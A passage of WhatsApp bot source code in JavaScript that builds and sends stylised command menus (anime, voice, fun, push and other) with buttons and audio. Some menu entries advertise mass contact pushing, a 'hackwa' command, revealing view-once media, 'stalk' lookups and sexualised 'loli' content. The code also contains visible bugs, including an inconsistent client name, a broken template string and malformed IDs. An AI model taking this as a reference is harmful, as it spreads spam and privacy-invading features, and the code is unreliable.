║➜ ${prefix}ғᴀᴄᴇʙᴏᴏᴋ  
║➜ ${prefix}ᴠɪᴅᴇʏ  
║➜ ${prefix}sɴᴀᴄᴋᴠɪᴅᴇᴏ  
┗━━━━━━━⭑
━─━─━─━─━─━─━─━─━
\`ᴜsᴍᴀɴ ᴄʜᴀᴄʜᴀʀ \`` 
Danzy.sendMessage(m.chat, {
  footer: foother,
  buttons: [
    {
      buttonId: `.owner`,
      buttonText: { displayText: 'Contact Owner' },
      type: 1
    },
    {
    buttonId: `.tqto`,
      buttonText: { displayText: 'Thanks To' },
      type: 1
    },
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Select This Menu',
          sections: [
            {
              title: 'Select This Menu',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'ALL MENU',
                  id: '.allmenu'
                },                
                {
                  title: 'OWNER MENU',
                  id: '.ownermenu'
                },                
                {
                  title: 'ANIME MENU',
                  id: '.animemenu'
                  },                
                {
                  title: 'PUSH MENU',
                  id: '.pushmenu'
                },                
                         
                {
                  title: 'DOWNLOAD MENU',
                  id: '.downloadmenu'
                },                
                {
                  title: 'GROUP MENU',
                  id: '.groupmenu'
                  },                
                {
                title: 'ASUPAN MENU',
                  id: '.asupanmenu'
                  },                
                {
                  title: 'VOICE MENU',
                  id: '.voicemenu'
                },                
                {
                  title: 'FUN MENU',
                  id: '.funmenu'
                  },                
                {
                  title: 'OTHERMENU',
                  id: '.othermenu'
                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
       image: { url: thumbnail },
       caption: menu,
    contextInfo: {
      mentionedJid: [m.sender],
      forwardingScore: 999,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
      newsletterName: "rizal-dev only Chanel?",
      newsletterJid: `120363417769859412@newsletterr`,
            },
      externalAdReply: {
        showAdAttribution: true, 
        title: namaBot,
        body: namafile,
        thumbnailUrl: 'https://i.ibb.co/d0XZLt4K/IMG-20250511-002924-317.jpg',
        sourceUrl: ch,
        mediaType: 1,
        renderLargerThumbnail: false
            }
    }
    }, {
                        quoted: qkontak
                    })
                    await sleep(2500)
     Denzy.sendMessage(m.chat, {
                        audio: fs.readFileSync('./start/lib/media/menu2.mp3'),
                        mimetype: 'audio/mp4',
                        ptt: true
                    }, {
                        quoted: fvn
                    })
                    }
break
        case "animemenu": {
        let menu = `*shname}.*   *${botname}*, 







┏═━ \`ɪɴғᴏʀᴍᴀᴛɪᴏɴ ᴜsᴇʀ\` ━━
║◦ᴏᴡɴᴇʀ ɴᴀᴍᴇ: *${pushname}* 
║◦ᴏᴡɴᴇʀ ɴᴜᴍʙᴇʀ : ${m.sender.split("@")[0]}
┗━━━━━━━━━━━━
┏═━ \`ɪɴғᴏʀᴍᴀᴛɪᴏɴ ʙᴏᴛ\` ━━
║◦ɴᴀᴍᴇ ʙᴏᴛ: *${botname}*  
║◦ᴏᴡɴᴇʀ ɴᴀᴍᴇ: *${ownername}*  
║◦ᴍᴏᴅᴇ: *${Denzy.public ? 'ᴘᴜʙʟɪᴄ' : 'sᴇʟғ'}*  
┗━━━━━━━━━━━━
┏═━ [\`ᴀɴɪᴍᴇ ᴍᴇɴᴜ\`] ━━
║➜ ${prefix}ᴀᴋɪʀᴀ
║➜ ${prefix}ᴀᴋɪʏᴀᴍᴀ
║➜ ${prefix}ᴀɴᴀ
║➜ ${prefix}ᴀsᴜɴᴀ
║➜ ${prefix}ᴀʏᴜᴢᴀᴡᴀ
║➜ ${prefix}ʙᴏʀᴜᴛᴏ
║➜ ${prefix}ᴄʜɪʜᴏ
║➜ ${prefix}ᴄʜɪᴛᴏɢᴇ
║➜ ${prefix}ᴄᴏsᴘʟᴀʏʟᴏʟɪ
║➜ ${prefix}ᴄᴏsᴘʟᴀʏsᴀɢɪʀɪ
║➜ ${prefix}ᴅᴇɪᴅᴀʀᴀ
║➜ ${prefix}ᴅᴏʀᴀᴇᴍᴏɴ
║➜ ${prefix}ᴇʟᴀɪɴᴀ
║➜ ${prefix}ᴇᴍɪʟɪᴀ
║➜ ${prefix}ᴇʀᴢᴀ
║➜ ${prefix}ɢʀᴇᴍᴏʀʏ
║➜ ${prefix}ʜᴇsᴛɪᴀ
║➜ ${prefix}ʜɪɴᴀᴛᴀ
║➜ ${prefix}ʜᴜsʙᴜ
║➜ ${prefix}ɪɴᴏʀɪ
║➜ ${prefix}ɪsᴜᴢᴜ
║➜ ${prefix}ɪᴛᴀᴄʜɪ
║➜ ${prefix}ɪᴛᴏʀɪ
║➜ ${prefix}ᴋᴀɢᴀ
║➜ ${prefix}ᴋᴀɢᴜʀᴀ
║➜ ${prefix}ᴋᴀᴋᴀsɪʜ
║➜ ${prefix}ᴋᴀᴏʀɪ
║➜ ${prefix}ᴋᴇɴᴇᴋɪ
║➜ ${prefix}ᴋᴏᴛᴏʀɪ
║➜ ${prefix}ᴋᴜʀᴜᴍɪ
║➜ ${prefix}ʟᴏʟɪ
║➜ ${prefix}ᴍᴀᴅᴀʀᴀ
║➜ ${prefix}ᴍᴇɢᴜᴍɪɴ
║➜ ${prefix}ᴍɪᴋᴀsᴀ
║➜ ${prefix}ᴍɪᴋᴇʏ
║➜ ${prefix}ᴍɪᴋᴜ
║➜ ${prefix}ᴍɪɴᴀᴛᴏ
║➜ ${prefix}ɴᴀʀᴜᴛᴏ
║➜ ${prefix}ɴᴇᴋᴏ
║➜ ${prefix}ɴᴇᴋᴏ2
║➜ ${prefix}ɴᴇᴋᴏɴɪᴍᴇ
║➜ ${prefix}ɴᴇᴢᴜᴋᴏ
║➜ ${prefix}ᴏɴᴇᴘɪᴇᴄᴇ
║➜ ${prefix}ᴘᴏᴋᴇᴍᴏɴ
║➜ ${prefix}ʀᴀɴᴅᴏᴍɴɪᴍᴇ
║➜ ${prefix}ʀᴀɴᴅᴏᴍɴɪᴍᴇ2
║➜ ${prefix}ʀɪᴢᴇ
║➜ ${prefix}sᴀɢɪʀɪ
║➜ ${prefix}sᴀᴋᴜʀᴀ
║➜ ${prefix}sᴀsᴜᴋᴇ
║➜ ${prefix}sʜɪɴᴀ
║➜ ${prefix}sʜɪɴᴋᴀ
║➜ ${prefix}sʜɪɴᴏᴍɪʏᴀ
║➜ ${prefix}sʜɪᴢᴜᴋᴀ
║➜ ${prefix}sʜᴏᴛᴀ
║➜ ${prefix}ᴛᴇᴊɪɴᴀ
║➜ ${prefix}ᴛᴏᴜᴋᴀᴄʜᴀɴ
║➜ ${prefix}ᴛsᴜɴᴀᴅᴇ
║➜ ${prefix}ᴡᴀɪғᴜ
║➜ ${prefix}ᴀɴɪᴍᴇᴡᴀʟʟ
║➜ ${prefix}ʏᴏᴛsᴜʙᴀ
║➜ ${prefix}ʏᴜᴋɪ
║➜ ${prefix}ʏᴜʟɪʙᴏᴄɪʟ
║➜ ${prefix}ʏᴜᴍᴇᴋᴏ
║➜ ${prefix}8ʙᴀʟʟ
║➜ ${prefix}ᴛɪᴄᴋʟᴇ
║➜ ${prefix}ɢᴇᴄɢ
║➜ ${prefix}ғᴇᴇᴅ
║➜ ${prefix}ᴀɴɪᴍᴇᴀᴡᴏᴏ
║➜ ${prefix}ᴀɴɪᴍᴇᴍᴇɢᴜᴍɪɴ
║➜ ${prefix}ᴀɴɪᴍᴇsʜɪɴᴏʙᴜ
║➜ ${prefix}ᴀɴɪᴍᴇʜᴀɴᴅʜᴏʟᴅ
║➜ ${prefix}ᴀɴɪᴍᴇʜɪɢʜғɪᴠᴇ
║➜ ${prefix}ᴀɴɪᴍᴇᴄʀɪɴɢᴇ
║➜ ${prefix}ᴀɴɪᴍᴇᴅᴀɴᴄᴇ
║➜ ${prefix}ᴀɴɪᴍᴇʜᴀᴘᴘʏ
║➜ ${prefix}ᴀɴɪᴍᴇɢʟᴏᴍᴘ
║➜ ${prefix}ᴀɴɪᴍᴇʙʟᴜsʜ
║➜ ${prefix}ᴀɴɪᴍᴇsᴍᴜɢ
║➜ ${prefix}ᴀɴɪᴍᴇᴡᴀᴠᴇ
║➜ ${prefix}ᴀɴɪᴍᴇsᴍɪʟᴇ
║➜ ${prefix}ᴀɴɪᴍᴇᴘᴏᴋᴇ
║➜ ${prefix}ᴀɴɪᴍᴇᴡɪɴᴋ
║➜ ${prefix}ᴀɴɪᴍᴇʙᴏɴᴋ
║➜ ${prefix}ᴀɴɪᴍᴇʙᴜʟʟʏ
║➜ ${prefix}ᴀɴɪᴍᴇʏᴇᴇᴛ
║➜ ${prefix}ᴀɴɪᴍᴇʙɪᴛᴇ
║➜ ${prefix}ᴀɴɪᴍᴇʟɪᴄᴋ
║➜ ${prefix}ᴀɴɪᴍᴇᴋɪʟʟ
║➜ ${prefix}ᴀɴɪᴍᴇᴄʀʏ
║➜ ${prefix}ᴀɴɪᴍᴇᴡʟᴘ
║➜ ${prefix}ᴀɴɪᴍᴇᴋɪss
║➜ ${prefix}ᴀɴɪᴍᴇʜᴜɢ
║➜ ${prefix}ᴀɴɪᴍᴇɴᴇᴋᴏ
║➜ ${prefix}ᴀɴɪᴍᴇᴘᴀᴛ
║➜ ${prefix}ᴀɴɪᴍᴇsʟᴀᴘ
║➜ ${prefix}ᴀɴɪᴍᴇᴄᴜᴅᴅʟᴇ
║➜ ${prefix}ᴀɴɪᴍᴇᴡᴀɪғᴜ
║➜ ${prefix}ᴀɴɪᴍᴇɴᴏᴍ
║➜ ${prefix}ᴀɴɪᴍᴇғᴏxɢɪʀʟ
║➜ ${prefix}ᴀɴɪᴍᴇɢᴇᴄɢ
║➜ ${prefix}ᴀɴɪᴍᴇᴛɪᴄᴋʟᴇ
║➜ ${prefix}ᴀɴɪᴍᴇғᴇᴇᴅ
║➜ ${prefix}ᴀɴɪᴍᴇᴀᴠᴀᴛᴀʀ
║➜ ${prefix}ɢᴇɴsʜɪɴ
║➜ ${prefix}ᴀɴɪᴍᴇ
║➜ ${prefix}ᴀᴍᴠ
║➜ ${prefix}ʙʟᴜᴇᴀʀᴄʜɪᴠᴇ
║➜ ${prefix}ᴡᴀɪғᴜ
║➜ ${prefix}ᴡᴀɪғᴜ1
║➜ ${prefix}ʀᴀɴᴅᴏᴍᴡᴀɪғᴜ
┗━━━━━━━⭑
━─━─━─━─━─━─━─━─━
\`ᴜsᴍᴀɴ ᴄʜᴀᴄʜᴀʀ\``
Denzy.sendMessage(m.chat, {
  footer: foother,
  buttons: [
    {
      buttonId: `.owner`,
      buttonText: { displayText: 'Contact Owner' },
      type: 1
    },
    {
    buttonId: `.tqto`,
      buttonText: { displayText: 'Thanks To' },
      type: 1
    },
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Select This Menu',
          sections: [
            {
              title: 'Select This Menu',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'ALL MENU',
                  id: '.allmenu'
                },                
                {
                  title: 'OWNER MENU',
                  id: '.ownermenu'
                },                
                {
                  title: 'ANIME MENU',
                  id: '.animemenu'
                  },                
                {
                  title: 'PUSH MENU',
                  id: '.pushmenu'
                },                
                         
                {
                  title: 'DOWNLOAD MENU',
                  id: '.downloadmenu'
                },                
                {
                  title: 'GROUP MENU',
                  id: '.groupmenu'
                  },                
                {
                title: 'ASUPAN MENU',
                  id: '.asupanmenu'
                  },                
                {
                  title: 'VOICE MENU',
                  id: '.voicemenu'
                },                
                {
                  title: 'FUN MENU',
                  id: '.funmenu'
                  },                
                {
                  title: 'OTHERMENU',
                  id: '.othermenu'
                }
              ]
            }
          ]
        })
      }
      }
  ],
    headerType: 1,
  viewOnce: true,
       image: { url: thumbnail },
       caption: menu,
    contextInfo: {
      mentionedJid: [m.sender],
      forwardingScore: 999,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
      newsletterName: "us mods",
      newsletterJid: `120363417769859412@newsletterr`,
            },
      externalAdReply: {
        showAdAttribution: true, 
        title: namaBot,
        body: namafile,
        thumbnailUrl: 'https://i.ibb.co/d0XZLt4K/IMG-20250511-002924-317.jpg',
        sourceUrl: ch,
        mediaType: 1,
        renderLargerThumbnail: false
            }
    }
    }, {
                        quoted: qkontak
                    })
                    await sleep(2500)
     Denzy.sendMessage(m.chat, {
                        audio: fs.readFileSync('./start/lib/media/menu2.mp3'),
                        mimetype: 'audio/mp4',
                        ptt: true
                    }, {
                        quoted: fvn
                    })
                    }
break
case "voicemenu": {
        let menu = `* ${pushname}.*   *${botname}*, 







┏═━ \`ɪɴғᴏʀᴍᴀᴛɪᴏɴ ᴜsᴇʀ\` ━━
║◦ᴏᴡɴᴇʀ ɴᴀᴍᴇ: *${pushname}* 
║◦ᴏᴡɴᴇʀ ɴᴜᴍʙᴇʀ : ${m.sender.split("@")[0]}
┗━━━━━━━━━━━━
┏═━ \`ɪɴғᴏʀᴍᴀᴛɪᴏɴ ʙᴏᴛ\` ━━
║◦ɴᴀᴍᴇ ʙᴏᴛ: *${botname}*  
║◦ᴏᴡɴᴇʀ ɴᴀᴍᴇ: *${ownername}*  
║◦ᴍᴏᴅᴇ: *${Denzy.public ? 'ᴘᴜʙʟɪᴄ' : 'sᴇʟғ'}*  
┗━━━━━━━━━━━━
┏═━ [\`ᴠᴏɪᴄᴇ ᴍᴇɴᴜ\`] ━━
║➜ ${prefix}ғᴀsᴛ  
║➜ ${prefix}ᴛᴜᴘᴀɪ  
║➜ ${prefix}ʙʟᴏᴡɴ  
║➜ ${prefix}ʙᴀss  
║➜ ${prefix}sᴍᴏᴏᴛʜ  
║➜ ${prefix}ᴅᴇᴇᴘ  
║➜ ${prefix}ᴇᴀʀʀᴀᴘᴇ  
║➜ ${prefix}ɴɪɢʜᴛᴄᴏʀᴇ  
║➜ ${prefix}ғᴀᴛ  
║➜ ${prefix}ʀᴏʙᴏᴛ  
║➜ ${prefix}sʟᴏᴡ  
║➜ ${prefix}ʀᴇᴠᴇʀsᴇ  
┗━━━━━━━⭑
━─━─━─━─━─━─━─━─━
\`ᴜsᴍᴀɴ ᴄʜᴀᴄʜᴀʀ \``
Denzy.sendMessage(m.chat, {
  footer: foother,
  buttons: [
    {
      buttonId: `.owner`,
      buttonText: { displayText: 'Contact Owner' },
      type: 1
    },
    {
    buttonId: `.tqto`,
      buttonText: { displayText: 'Thanks To' },
      type: 1
    },
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Select This Menu',
          sections: [
            {
              title: 'Select This Menu',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'ALL MENU',
                  id: '.allmenu'
                },                
                {
                  title: 'OWNER MENU',
                  id: '.ownermenu'
                },                
                {
                  title: 'ANIME MENU',
                  id: '.animemenu'
                  },                
                {
                  title: 'PUSH MENU',
                  id: '.pushmenu'
                },                
                         
                {
                  title: 'DOWNLOAD MENU',
                  id: '.downloadmenu'
                },                
                {
                  title: 'GROUP MENU',
                  id: '.groupmenu'
                  },                
                {
                title: 'ASUPAN MENU',
                  id: '.asupanmenu'
                  },                
                {
                  title: 'VOICE MENU',
                  id: '.voicemenu'
                },                
                {
                  title: 'FUN MENU',
                  id: '.funmenu'
                  },                
                {
                  title: 'OTHERMENU',
                  id: '.othermenu'
                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
       image: { url: thumbnail },
       caption: menu,
    contextInfo: {
      mentionedJid: [m.sender],
      forwardingScore: 999,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
      newsletterName: "ᴜsᴍᴀɴ ᴄʜᴀᴄʜᴀʀ", newsletterJid: `120363377429302268@newsletterr`,
            },
      externalAdReply: {
        showAdAttribution: true, 
        title: namaBot,
        body: namafile,
        thumbnailUrl: 'https://i.ibb.co/d0XZLt4K/IMG-20250511-002924-317.jpg',
        sourceUrl: ch,
        mediaType: 1,
        renderLargerThumbnail: false
            }
    }
    }, {
                        quoted: qkontak
                    })
                    await sleep(2500)
     Denzy.sendMessage(m.chat, {
                        audio: fs.readFileSync('./start/lib/media/menu2.mp3'),
                        mimetype: 'audio/mp4',
                        ptt: true
                    }, {
                        quoted: fvn
                    })
                    }
break
case "othermenu": {
        let menu = ` ${pushname}.*   *${botname}*, 







┏═━ \`ɪɴғᴏʀᴍᴀᴛɪᴏɴ ᴜsᴇʀ\` ━━
║◦ᴏᴡɴᴇʀ ɴᴀᴍᴇ: *${pushname}* 
║◦ᴏᴡɴᴇʀ ɴᴜᴍʙᴇʀ : ${m.sender.split("@")[0]}
┗━━━━━━━━━━━━
┏═━ \`ɪɴғᴏʀᴍᴀᴛɪᴏɴ ʙᴏᴛ\` ━━
║◦ɴᴀᴍᴇ ʙᴏᴛ: *${botname}*  
║◦ᴏᴡɴᴇʀ ɴᴀᴍᴇ: *${ownername}*  
║◦ᴍᴏᴅᴇ: *${Denzy.public ? 'ᴘᴜʙʟɪᴄ' : 'sᴇʟғ'}*  
┗━━━━━━━━━━━━
┏═━ [\`ᴏᴛʜᴇʀ ᴍᴇɴᴜ\`] ━━
║➜ ${prefix}sᴍᴇᴍᴇ  
║➜ ${prefix}ʟʏʀɪᴄ
║➜ ${prefix}ᴀɪᴄʟᴀᴜᴅᴇ  
║➜ ${prefix}ᴋᴇɴᴏɴ
║➜ ${prefix}ʀᴇᴍᴏᴠᴇʙɢ
║➜ ${prefix}ʜᴅ
║➜ ${prefix}ᴛᴏᴀɴɪᴍᴇ
║➜ ${prefix}ʜᴅ1
║➜ ${prefix}sᴜᴘᴇʀʜᴅ
║➜ ${prefix}ʀᴇᴍɪɴɪ
║➜ ${prefix}ʙᴜʏsᴄ
║➜ ${prefix}ᴘᴀʏᴍᴇɴᴛ
║➜ ${prefix}ʟɪsᴛᴘᴀɴᴇʟ
║➜ ${prefix}ʟɪsᴛᴠᴘs
┗━━━━━━━⭑
━─━─━─━─━─━─━─━─━
\`ᴜsᴍᴀɴ ᴄʜᴀᴄʜᴀʀ \``
Danzy.sendMessage(m.chat, {
  footer: foother,
  buttons: [
    {
      buttonId: `.owner`,
      buttonText: { displayText: 'Contact Owner' },
      type: 1
    },
    {
    buttonId: `.tqto`,
      buttonText: { displayText: 'Thanks To' },
      type: 1
    },
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Select This Menu',
          sections: [
            {
              title: 'Select This Menu',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'ALL MENU',
                  id: '.allmenu'
                },                
                {
                  title: 'OWNER MENU',
                  id: '.ownermenu'
                },                
                {
                  title: 'ANIME MENU',
                  id: '.animemenu'
                  },                
                {
                  title: 'PUSH MENU',
                  id: '.pushmenu'
                },                
                         
                {
                  title: 'DOWNLOAD MENU',
                  id: '.downloadmenu'
                },                
                {
                  title: 'GROUP MENU',
                  id: '.groupmenu'
                  },                
                {
                title: 'ASUPAN MENU',
                  id: '.asupanmenu'
                  },                
                {
                  title: 'VOICE MENU',
                  id: '.voicemenu'
                },                
                {
                  title: 'FUN MENU',
                  id: '.funmenu'
                  },                
                {
                  title: 'OTHERMENU',
                  id: '.othermenu'
                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
       image: { url: thumbnail },
       caption: menu,
    contextInfo: {
      mentionedJid: [m.sender],
      forwardingScore: 999,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
      newsletterName: "ᴜsᴍᴀɴ ᴄʜᴀᴄʜᴀʀ", newsletterJid: `120363377429302268@newsletterr`,
            },
      externalAdReply: {
        showAdAttribution: true, 
        title: namaBot,
        body: namafile,
        thumbnailUrl: 'https://i.ibb.co/d0XZLt4K/IMG-20250511-002924-317.jpg',
        sourceUrl: ch,
        mediaType: 1,
        renderLargerThumbnail: false
            }
    }
    }, {
                        quoted: qkontak
                    })
                    await sleep(2500)
     Denzy.sendMessage(m.chat, {
                        audio: fs.readFileSync('./start/lib/media/menu2.mp3'),
                        mimetype: 'audio/mp4',
                        ptt: true
                    }, {
                        quoted: fvn
                    })
                    }
break
case "funmenu": {
        let menu = `*shname}.*   *${botname}*, 







┏═━ \`ɪɴғᴏʀᴍᴀᴛɪᴏɴ ᴜsᴇʀ\` ━━
║◦ᴏᴡɴᴇʀ ɴᴀᴍᴇ: *${pushname}* 
║◦ᴏᴡɴᴇʀ ɴᴜᴍʙᴇʀ : ${m.sender.split("@")[0]}
┗━━━━━━━━━━━━
┏═━ \`ɪɴғᴏʀᴍᴀᴛɪᴏɴ ʙᴏᴛ\` ━━
║◦ɴᴀᴍᴇ ʙᴏᴛ: *${botname}*  
║◦ᴏᴡɴᴇʀ ɴᴀᴍᴇ: *${ownername}*  
║◦ᴍᴏᴅᴇ: *${Denzy.public ? 'ᴘᴜʙʟɪᴄ' : 'sᴇʟғ'}*  
┗━━━━━━━━━━━━
┏═━ [\`ғᴜɴ ᴍᴇɴᴜ\`] ━━
║➜ ${prefix}ʀᴠᴏ
║➜ ${prefix}ᴀɴɪᴍᴇ
║➜ ${prefix}ǫᴜᴏᴛᴇs
║➜ ${prefix}ɴsғᴡ 
║➜ ${prefix}ᴛᴏᴜʀʟ 
║➜ ${prefix}ᴡᴀɴɢʏ 
║➜ ${prefix}sᴀʏᴀɴɢ 
║➜ ${prefix}ᴛᴏᴜʀʟ𝟷
║➜ ${prefix}ᴛᴏᴜʀʟ𝟸
║➜ ${prefix}ᴛᴏᴜʀʟ𝟹
║➜ ${prefix}ᴀʀᴛɪᴏᴡɴᴇʀ ɴᴀᴍᴇ
║➜ ${prefix}ᴀʀᴛɪᴍɪᴍᴘɪ
║➜ ${prefix}sɪғᴀᴛ
║➜ ${prefix}ǫᴄ
║➜ ${prefix}sᴛɪᴄᴋᴇʀ
║➜ ${prefix}ʙʀᴀᴛ
║➜ ${prefix}ʜᴀᴄᴋᴡᴀ
║➜ ${prefix}ᴀᴋsᴀʀᴀsᴜɴᴅᴀ  
║➜ ${prefix}ᴡᴀɪғᴜ  
║➜ ${prefix}ᴄᴏsᴘʟᴀʏ  
║➜ ${prefix}ɢʟɪᴛᴄʜᴛᴇxᴛ
║➜ ${prefix}ғɪɴᴅsᴏɴɢ  
║➜ ${prefix}sspotify  
║➜ ${prefix}ʀᴀɴᴅᴏᴍsғᴡ  
║➜ ${prefix}ᴍᴇᴍᴇ  
║➜ ${prefix}ʀᴀᴍᴀʟᴀɴ
║➜ ${prefix}ʟᴜᴄᴋʏɴᴜᴍʙᴇʀ
║➜ ${prefix}ᴛɪᴍᴇ  
║➜ ${prefix}ᴜᴘᴄʜ
║➜ ${prefix}ᴜᴘsᴡ
║➜ ${prefix}ʀᴏʙʟᴏxsᴛᴀʟᴋ
┗━━━━━━━⭑
━─━─━─━─━─━─━─━─━
\`ᴜsᴍᴀɴ ᴄʜᴀᴄʜᴀʀ \``
Denzy.sendMessage(m.chat, {
  footer: foother,
  buttons: [
    {
      buttonId: `.owner`,
      buttonText: { displayText: 'Contact Owner' },
      type: 1
    },
    {
    buttonId: `.tqto`,
      buttonText: { displayText: 'Thanks To' },
      type: 1
    },
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Select This Menu',
          sections: [
            {
              title: 'Select This Menu',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'ALL MENU',
                  id: '.allmenu'
                },                
                {
                  title: 'OWNER MENU',
                  id: '.ownermenu'
                },                
                {
                  title: 'ANIME MENU',
                  id: '.animemenu'
                  },                
                {
                  title: 'PUSH MENU',
                  id: '.pushmenu'
                },                
                         
                {
                  title: 'DOWNLOAD MENU',
                  id: '.downloadmenu'
                },                
                {
                  title: 'GROUP MENU',
                  id: '.groupmenu'
                  },                
                {
                title: 'ASUPAN MENU',
                  id: '.asupanmenu'
                  },                
                {
                  title: 'VOICE MENU',
                  id: '.voicemenu'
                },                
                {
                  title: 'FUN MENU',
                  id: '.funmenu'
                  },                
                {
                  title: 'OTHERMENU',
                  id: '.othermenu'
                }
              ]
            }
          ]
        })
      }
      }
  ],
    headerType: 1,
  viewOnce: true,
       image: { url: thumbnail },
       caption: menu,
    contextInfo: {
      mentionedJid: [m.sender],
      forwardingScore: 999,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
      newsletterName: "us mods",
      newsletterJid: `120363417769859412@newsletterr`,
            },
      externalAdReply: {
        showAdAttribution: true, 
        title: namaBot,
        body: namafile,
        thumbnailUrl: 'https://i.ibb.co/d0XZLt4K/IMG-20250511-002924-317.jpg',
        sourceUrl: ch,
        mediaType: 1,
        renderLargerThumbnail: false
            }
    }
    }, {
                        quoted: qkontak
                    })
                    await sleep(2500)
     Denzy.sendMessage(m.chat, {
                        audio: fs.readFileSync('./start/lib/media/menu2.mp3'),
                        mimetype: 'audio/mp4',
                        ptt: true
                    }, {
                        quoted: fvn
                    })
                    }
break
case "pushmenu": {
        let menu = `*shname}.*   *${botname}*, 

┏═━ \`ɪɴғᴏʀᴍᴀᴛɪᴏɴ ᴜsᴇʀ\` ━━
║◦ᴏᴡɴᴇʀ ɴᴀᴍᴇ: *${pushname}* 
║◦ᴏᴡɴᴇʀ ɴᴜᴍʙᴇʀ : ${m.sender.split("@")[0]}
┗━━━━━━━━━━━━
┏═━ \`ɪɴғᴏʀᴍᴀᴛɪᴏɴ ʙᴏᴛ\` ━━
║◦ɴᴀᴍᴇ ʙᴏᴛ: *${botname}*  
║◦ᴏᴡɴᴇʀ ɴᴀᴍᴇ: *${ownername}*  
║◦ᴍᴏᴅᴇ: *${Denzy.public ? 'ᴘᴜʙʟɪᴄ' : 'sᴇʟғ'}*  
┗━━━━━━━━━━━━
┏═━ [\`ᴘᴜsʜ ᴍᴇɴᴜ\`] ━━
║➜ ${prefix}ᴄᴇᴋɪᴅᴄʜ
║➜ ${prefix}ᴄᴇᴋɪᴅɢᴄ
║➜ ${prefix}ᴘᴜsʜᴋᴏɴᴛᴀᴋ
║➜ ${prefix}ᴘᴜsʜᴋᴏɴᴛᴀᴋɪᴅ
║➜ ${prefix}ᴅᴏɴᴇ
║➜ ${prefix}ᴄsᴇsɪ  
║➜ ${prefix}ᴀᴅᴅᴄᴀsᴇ
║➜ ${prefix}ᴜᴘsᴡ  
║➜ ${prefix}ᴘᴜʙʟɪᴄ  
║➜ ${prefix}sᴇʟғ  
┗━━━━━━━⭑
━─━─━─━─━─━─━─━─━
\`ᴜsᴍᴀɴ ᴄʜᴀᴄʜᴀʀ\``
Denzy.sendMessage(m.chat, {
  footer: foother,
  buttons: [
    {
      buttonId: `.owner`,
      buttonText: { displayText: 'Contact Owner' },
      type: 1
    },
    {
    buttonId: `.tqto`,
      buttonText: { displayText: 'Thanks To' },
      type: 1
    },
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Select This Menu',
          sections: [
            {
              title: 'Select This Menu',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'ALL MENU',
                  id: '.allmenu'
                },                
                {
                  title: 'OWNER MENU',
                  id: '.ownermenu'
                },                
                {
                  title: 'ANIME MENU',
                  id: '.animemenu'
                  },                
                {
                  title: 'PUSH MENU',
                  id: '.pushmenu'
                },                
                         
                {
                  title: 'DOWNLOAD MENU',
                  id: '.downloadmenu'
                },                
                {
                  title: 'GROUP MENU',
                  id: '.groupmenu'
                  },                
                {
                title: 'ASUPAN MENU',
                  id: '.asupanmenu'
                  },                
                {
                  title: 'VOICE MENU',
                  id: '.voicemenu'
                },                
                {
                  title: 'FUN MENU',
                  id: '.funmenu'
                  },                
                {
                  title: 'OTHERMENU',
                  id: '.othermenu'
                }
              ]
            }
          ]
        })
      }
      }
  ],
    headerType: 1,
  viewOnce: true,
       image: { url: thumbnail },
       caption: menu,
    contextInfo: {
      mentionedJid: [m.sender],
      forwardingScore: 999,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
      newsletterName: "us mods",
      newsletterJid: `120363417769859412@newsletterr`,
            },
      externalAdReply: {
        showAdAttribution: true, 
        title: namaBot,
        body: namafile,
        thumbnailUrl: 'https://i.ibb.co/d0XZLt4K/IMG-20250511-002924-317.jpg',
        sourceUrl: ch,
        mediaType: 1,
        renderLargerThumbnail: false
            }
    }
    }, {
                        quoted: qkontak
                    })
                    await sleep(2500)
     Denzy.sendMessage(m.chat, {
                        audio: fs.readFileSync('./start/lib/media/menu2.mp3'),
                        mimetype: 'audio/mp4',
                        ptt: true
                    }, {
                        quoted: fvn
                    })
                    }
break
case "asupanmenu": {
        let menu = `* ${pushname}.*   *${botname}*, 







┏═━ \`ɪɴғᴏʀᴍᴀᴛɪᴏɴ ᴜsᴇʀ\` ━━
║◦ᴏᴡɴᴇʀ ɴᴀᴍᴇ: *${pushname}* 
║◦ᴏᴡɴᴇʀ ɴᴜᴍʙᴇʀ : ${m.sender.split("@")[0]}
┗━━━━━━━━━━━━
┏═━ \`ɪɴғᴏʀᴍᴀᴛɪᴏɴ ʙᴏᴛ\` ━━
║◦ɴᴀᴍᴇ ʙᴏᴛ: *${botname}*  
║◦ᴏᴡɴᴇʀ ɴᴀᴍᴇ: *${ownername}*  
║◦ᴍᴏᴅᴇ: *${Denzy.public ? 'ᴘᴜʙʟɪᴄ' : 'sᴇʟғ'}*  
┗━━━━━━━━━━━━
